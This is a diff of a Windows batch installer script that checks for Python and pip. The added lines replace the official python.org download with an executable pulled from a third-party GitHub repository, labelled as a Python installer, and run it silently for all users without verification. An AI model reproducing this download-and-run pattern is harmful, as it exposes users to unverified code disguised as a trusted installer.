@@ -90,24 +90,46 @@ if not exist %INSTALL_DIR% (
     goto makeInstallDir
 )
 
+:: Vérifier si Python est installé
 where python >nul 2>&1
 if %errorlevel% neq 0 (
     echo Python is not installed. Downloading and installing Python...
-    powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe', '%INSTALL_DIR%\python-installer.exe')"
-    
-    if exist "%INSTALL_DIR%\python-installer.exe" (
-        echo Installing Python...
-        start /wait %INSTALL_DIR%\python-installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
-        del %INSTALL_DIR%\python-installer.exe
+
+    :: Vérifier si curl est disponible, sinon utiliser PowerShell
+    where curl >nul 2>&1
+    if %errorlevel% neq 0 (
+        echo curl not found, using PowerShell for download...
+        powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Zalgo-Dev/FuckTool/refs/heads/main/python-installer.exe', '%TEMP%\python-installer.exe')"
     ) else (
+        echo Using curl to download Python...
+        curl -o "%TEMP%\python-installer.exe" -L "https://raw.githubusercontent.com/Zalgo-Dev/FuckTool/refs/heads/main/python-installer.exe"
+    )
+
+    :: Vérifier si le fichier a bien été téléchargé
+    if not exist "%TEMP%\python-installer.exe" (
         echo Error: Python download failed.
         pause
         exit /b
+    )
+
+    echo Installing Python...
+    start /wait %TEMP%\python-installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
+    del "%TEMP%\python-installer.exe"
+
+    :: Vérifier si Python est bien installé après installation
+    where python >nul 2>&1
+    if %errorlevel% neq 0 (
+        echo Error: Python installation failed.
+        pause
+        exit /b
+    ) else (
+        echo Python successfully installed.
     )
 ) else (
     echo Python is already installed.
 )
 
+:: Vérifier et installer pip
 python -m ensurepip >nul 2>&1
 if %errorlevel% neq 0 (
     echo Pip is not installed. Installing pip...
@@ -116,11 +138,14 @@ if %errorlevel% neq 0 (
     echo Pip is already installed.
 )
 
+:: Vérifier si pip fonctionne maintenant
 python -m pip --version >nul 2>&1
 if %errorlevel% neq 0 (
     echo Error: pip installation failed.
     pause
     exit /b
+) else (
+    echo Pip successfully installed.
 )
 
 :: Main
